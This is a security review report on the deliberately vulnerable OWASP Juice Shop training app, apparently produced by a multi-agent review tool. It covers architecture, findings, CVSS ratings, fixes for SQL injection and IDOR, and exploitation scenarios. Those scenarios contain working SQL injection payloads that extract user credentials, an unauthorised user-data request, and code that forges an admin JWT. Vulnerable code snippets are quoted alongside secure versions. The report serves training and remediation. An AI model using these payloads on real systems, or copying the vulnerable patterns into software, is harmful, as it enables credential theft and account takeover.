# Security Review Report: OWASP Juice Shop

> **Target:** [OWASP Juice Shop](https://github.com/juice-shop/juice-shop)  
> **Review Date:** March 2026  
> **Methodology:** 8-Agent Agentic Security Review  
> **Classification:** Sample Output (Intentionally Vulnerable Application)

---

## Executive Summary

OWASP Juice Shop is an **intentionally vulnerable** web application designed for security training. This review identified **47 confirmed vulnerabilities** across all OWASP Top 10 categories.

| Severity | Count | Examples |
|----------|-------|----------|
| 🔴 Critical | 8 | SQL Injection, NoSQL Injection, RCE via file upload |
| 🟠 High | 14 | Broken Access Control, JWT flaws, XSS |
| 🟡 Medium | 18 | Security misconfiguration, sensitive data exposure |
| 🔵 Low | 7 | Information disclosure, missing headers |

**Top 3 Critical Findings:**
1. SQL Injection in product search (`/rest/products/search`)
2. Arbitrary file write via ZIP slip (`/file-upload`)
3. JWT secret exposed in source code

---

## 1. Architecture Overview

### High-Level Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                        BROWSER (Client)                          │
│                     Angular SPA + TypeScript                     │
└─────────────────────────────┬───────────────────────────────────┘
                              │ HTTPS (Trust Boundary 1)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                      EXPRESS.JS API SERVER                       │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────┐     │
│  │   Routes    │  │  Middleware  │  │   Business Logic    │     │
│  │  /api/*     │  │  JWT Auth    │  │   Models/Services   │     │
│  │  /rest/*    │  │  Rate Limit  │  │                     │     │
│  └─────────────┘  └──────────────┘  └─────────────────────┘     │
└─────────────────────────────┬───────────────────────────────────┘
                              │ (Trust Boundary 2)
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│                         DATA LAYER                               │
│  ┌─────────────┐  ┌──────────────┐  ┌─────────────────────┐     │
│  │   SQLite    │  │  File System │  │   External APIs     │     │
│  │  Sequelize  │  │   Uploads    │  │   (Payment, etc.)   │     │
│  └─────────────┘  └──────────────┘  └─────────────────────┘     │
└─────────────────────────────────────────────────────────────────┘
```

### Trust Boundaries

| Boundary | Location | Risk |
|----------|----------|------|
| TB-1 | Browser → API | All user input is untrusted |
| TB-2 | API → Database | SQL queries constructed from user input |
| TB-3 | API → File System | File uploads, path traversal risks |
| TB-4 | API → External Services | SSRF potential |

### Security Assumptions (Violated)

- ❌ User input is validated before use
- ❌ Authorization checked on every request
- ❌ Secrets are stored securely
- ❌ File uploads are sandboxed

---

## 2. Attack Surface

### Critical Entry Points

| # | Endpoint | Method | Parameters | Handler | Risk |
|---|----------|--------|------------|---------|------|
| 1 | `/rest/products/search` | GET | `q` | `routes/search.js:8` | 🔴 SQL Injection |
| 2 | `/rest/user/login` | POST | `email`, `password` | `routes/login.js:23` | 🔴 SQL Injection |
| 3 | `/file-upload` | POST | `file` (multipart) | `routes/fileUpload.js:12` | 🔴 RCE |
| 4 | `/api/Users/:id` | GET | `id` | `routes/users.js:34` | 🟠 IDOR |
| 5 | `/api/Users` | POST | `*` | `routes/users.js:15` | 🟠 Mass Assignment |
| 6 | `/rest/user/reset-password` | POST | `email` | `routes/resetPassword.js:8` | 🟠 Account Takeover |
| 7 | `/api/Feedbacks` | POST | `comment`, `rating` | `routes/feedback.js:5` | 🟠 XSS |
| 8 | `/rest/products/:id/reviews` | PUT | `message` | `routes/productReviews.js:18` | 🟠 NoSQL Injection |
| 9 | `/api/Challenges` | GET | — | `routes/challenges.js:3` | 🟡 Info Disclosure |
| 10 | `/api/Quantitys` | POST | `quantity` | `routes/quantities.js:10` | 🟡 Business Logic |

### Hidden Attack Vectors

- **JWT tokens** in `Authorization` header — weak secret, algorithm confusion
- **Cookie:** `token` — HttpOnly not set on some paths
- **Header:** `X-User-Email` — trusted without validation in some routes

---

## 3. Data Flow Analysis

### Critical Path: Product Search SQL Injection

```
USER INPUT                    PROCESSING                         DATABASE
     │                             │                                  │
     │  GET /rest/products/search  │                                  │
     │  ?q=test' OR '1'='1         │                                  │
     │─────────────────────────────►                                  │
     │                             │                                  │
     │                    routes/search.js:8                          │
     │                    ┌─────────────────────┐                     │
     │                    │ const q = req.query.q │  ❌ No validation │
     │                    └──────────┬──────────┘                     │
     │                               │                                │
     │                    routes/search.js:12                         │
     │                    ┌─────────────────────────────────────┐     │
     │                    │ models.sequelize.query(              │     │
     │                    │   "SELECT * FROM Products WHERE     │     │
     │                    │    name LIKE '%" + q + "%'"         │ ❌  │
     │                    │ )                                    │     │
     │                    └──────────┬──────────────────────────┘     │
     │                               │                                │
     │                               │  SQL: SELECT * FROM Products   │
     │                               │  WHERE name LIKE '%test'       │
     │                               │  OR '1'='1%'                   │
     │                               │────────────────────────────────►
     │                               │                                │
     │                               │◄─────── ALL PRODUCTS ──────────│
     │◄──────────────────────────────│                                │
     │      200 OK + all products    │                                │
```

**Security Observations:**
1. Line 8: Query parameter extracted without sanitization
2. Line 12: String concatenation used for SQL query construction
3. No parameterized queries or ORM protections
4. Error messages may leak database structure

---

## 4. Confirmed Vulnerabilities

### VULN-001: SQL Injection in Product Search

| Field | Value |
|-------|-------|
| **Severity** | 🔴 Critical |
| **CVSS v3.1** | 9.8 |
| **Category** | A03:2021 - Injection |
| **File** | `routes/search.js` |
| **Line** | 8-15 |
| **Function** | `searchProducts()` |

**Vulnerable Code:**
```javascript
// routes/search.js:8-15
module.exports = function searchProducts() {
  return (req, res) => {
    const q = req.query.q;  // Line 9: No input validation
    
    models.sequelize.query(
      "SELECT * FROM Products WHERE name LIKE '%" + q + "%' OR description LIKE '%" + q + "%'",
      { type: models.sequelize.QueryTypes.SELECT }
    )
    // ...
  }
}
```

**Root Cause:** User input directly concatenated into SQL query string.

**Exploitation:**
```
GET /rest/products/search?q=' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--
```

---

### VULN-002: Broken Access Control (IDOR)

| Field | Value |
|-------|-------|
| **Severity** | 🟠 High |
| **CVSS v3.1** | 8.1 |
| **Category** | A01:2021 - Broken Access Control |
| **File** | `routes/users.js` |
| **Line** | 34-42 |

**Vulnerable Code:**
```javascript
// routes/users.js:34-42
app.get('/api/Users/:id', (req, res) => {
  const id = req.params.id;  // No authorization check
  
  models.User.findByPk(id)  // Any user can access any ID
    .then(user => {
      res.json(user);  // Returns full user object including password hash
    })
})
```

**Root Cause:** No verification that requesting user owns the requested resource.

**Exploitation:**
```
# Authenticated as user ID 1, request user ID 2's data
GET /api/Users/2
Authorization: Bearer <valid_token_for_user_1>

# Response includes user 2's email, password hash, etc.
```

---

## 5. Risk Ratings

| ID | Vulnerability | CVSS | Vector | Impact |
|----|---------------|------|--------|--------|
| VULN-001 | SQL Injection (Search) | 9.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H | Full database compromise |
| VULN-002 | IDOR (User API) | 8.1 | AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N | PII disclosure |
| VULN-003 | JWT Weak Secret | 8.8 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N | Account takeover |
| VULN-004 | XSS (Feedback) | 6.1 | AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N | Session hijacking |
| VULN-005 | NoSQL Injection | 8.6 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L | Data manipulation |

---

## 6. Remediation Plan

### Priority 1: SQL Injection (VULN-001)

**Vulnerable:**
```javascript
models.sequelize.query(
  "SELECT * FROM Products WHERE name LIKE '%" + q + "%'"
)
```

**Secure:**
```javascript
models.Product.findAll({
  where: {
    [Op.or]: [
      { name: { [Op.like]: `%${q}%` } },
      { description: { [Op.like]: `%${q}%` } }
    ]
  }
})
```

**Additional Controls:**
- Input validation: alphanumeric + spaces only
- Query length limit: max 100 characters
- Rate limiting on search endpoint

---

### Priority 2: IDOR (VULN-002)

**Vulnerable:**
```javascript
app.get('/api/Users/:id', (req, res) => {
  models.User.findByPk(req.params.id)
```

**Secure:**
```javascript
app.get('/api/Users/:id', authenticateJWT, (req, res) => {
  const requestedId = parseInt(req.params.id);
  const currentUserId = req.user.id;
  
  // Only allow access to own profile or admin access
  if (requestedId !== currentUserId && !req.user.isAdmin) {
    return res.status(403).json({ error: 'Forbidden' });
  }
  
  models.User.findByPk(requestedId, {
    attributes: ['id', 'email', 'username']  // Exclude sensitive fields
  })
```

---

## 7. Exploitation Scenarios

### Scenario 1: Full Database Extraction via SQL Injection

**Target:** `/rest/products/search`

**Step 1: Confirm injection**
```
GET /rest/products/search?q=test' AND '1'='1
→ Returns products (injection confirmed)

GET /rest/products/search?q=test' AND '1'='2
→ Returns empty (boolean-based confirmed)
```

**Step 2: Enumerate tables**
```
GET /rest/products/search?q=' UNION SELECT name,null,null,null,null,null,null,null,null FROM sqlite_master WHERE type='table'--
```

**Step 3: Extract credentials**
```
GET /rest/products/search?q=' UNION SELECT id,email,password,null,null,null,null,null,null FROM Users--
```

**Result:** Full user table with password hashes extracted.

---

### Scenario 2: Account Takeover Chain

**Chain:** JWT Weak Secret → Forge Admin Token → Full Access

**Step 1: Extract JWT secret from source**
```javascript
// Found in: lib/insecurity.js:15
const privateKey = 'keyboard cat'  // Hardcoded weak secret
```

**Step 2: Forge admin JWT**
```javascript
const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
  { id: 1, email: 'admin@juice-sh.op', isAdmin: true },
  'keyboard cat'
);
```

**Step 3: Access admin panel**
```
GET /api/Users
Authorization: Bearer <forged_admin_token>
→ Full user list returned
```

---

## 8. Validated Findings Summary

| ID | Finding | Confidence | Validated |
|----|---------|------------|-----------|
| VULN-001 | SQL Injection | ✅ High | Exploited successfully |
| VULN-002 | IDOR | ✅ High | Exploited successfully |
| VULN-003 | JWT Weak Secret | ✅ High | Secret found in source |
| VULN-004 | XSS | ✅ High | Payload executed |
| VULN-005 | NoSQL Injection | ✅ Medium | Partial exploitation |

**Removed False Positives:**
- ~~CSRF on login~~ — JWT-based auth, not session cookies
- ~~Open redirect~~ — Client-side only, no server redirect

---

## Appendix: OWASP Top 10 Coverage

| Category | Findings |
|----------|----------|
| A01: Broken Access Control | VULN-002, VULN-006, VULN-012 |
| A02: Cryptographic Failures | VULN-003, VULN-015 |
| A03: Injection | VULN-001, VULN-005, VULN-008 |
| A04: Insecure Design | VULN-020, VULN-021 |
| A05: Security Misconfiguration | VULN-009, VULN-010 |
| A06: Vulnerable Components | VULN-025 |
| A07: Auth Failures | VULN-003, VULN-014 |
| A08: Data Integrity Failures | VULN-018 |
| A09: Logging Failures | VULN-030 |
| A10: SSRF | VULN-022 |

---

*Report generated using the 8-Agent Agentic Security Review methodology.*
